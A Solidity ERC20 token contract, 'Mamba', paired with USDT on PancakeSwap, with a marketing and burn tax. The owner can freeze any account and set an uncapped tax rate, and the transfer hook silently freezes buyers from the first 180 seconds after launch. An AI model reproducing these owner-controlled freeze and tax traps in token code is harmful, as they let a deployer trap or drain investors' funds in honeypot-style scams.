// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";


interface IPancakeRouter02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IPancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


contract Mamba is ERC20, Ownable{
    address public marketing;
    address public dead = 0x000000000000000000000000000000000000dEaD;

    IPancakeRouter02 public pancakeRouter = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address public pancakePair;
    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;

    mapping(address => bool) public isExemptFromTax;
    mapping(address => bool) public freeze;
    uint256 public taxRate = 2000;
    uint256 public timeRecord;

    constructor(
        address _marketing, 
        address _initialRecipient
    ) ERC20("Mamba","Mamba") Ownable(msg.sender) {
        marketing = _marketing;
        pancakePair = IPancakeFactory(pancakeRouter.factory())
            .createPair(address(this), USDT);

        isExemptFromTax[marketing] = true;
        isExemptFromTax[_initialRecipient] = true;
        isExemptFromTax[address(this)] = true;
        
        uint256 initialSupply = 1000000000 ether;
        _mint(_initialRecipient, initialSupply);
    }

    function setMarketing(address _marketing) external onlyOwner{
        marketing = _marketing;
        isExemptFromTax[_marketing] = true;
    }

    function setTaxExemption(address _addr, bool _exempt) external onlyOwner {
        isExemptFromTax[_addr] = _exempt;
    }

    function setFreeze(address _addr, bool _freeze) external onlyOwner{
        freeze[_addr] = _freeze;
    }

    function setTaxRate(uint256 _taxRate) external onlyOwner{
        taxRate = _taxRate;
    }


    function _update(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        require(!freeze[from],"ERC20: Account has been frozen.");

        {
            if(IERC20(pancakePair).totalSupply() > 0 && timeRecord == 0) timeRecord = block.timestamp;
            if(timeRecord > 0 && block.timestamp - timeRecord >= 3600 && taxRate == 2000) taxRate = 200; 
        }

        if (from == address(0) || to == address(0)) {
            super._update(from, to, amount);
            return;
        }


        bool isSell = to == pancakePair;
        bool isBuy = from == pancakePair;
        bool takeTax = isExemptFromTax[from] || isExemptFromTax[to];

        uint256 taxAmount = 0;
        bool isPair = (isSell || isBuy);
        if (!takeTax && isPair) taxAmount = (amount * taxRate) / 10000;

        if (taxAmount > 0) {
            uint256 half = taxAmount / 2;
            super._update(from, marketing, half);
            super._update(from, dead, taxAmount - half);
            super._update(from, to, amount - taxAmount);

        } else {
            super._update(from, to, amount);
        }

        //update
        {
            if(IERC20(pancakePair).totalSupply() > 0 && block.timestamp - timeRecord < 180 && isBuy && !isExemptFromTax[to]) freeze[to] = true; 
        }
        
    }

}

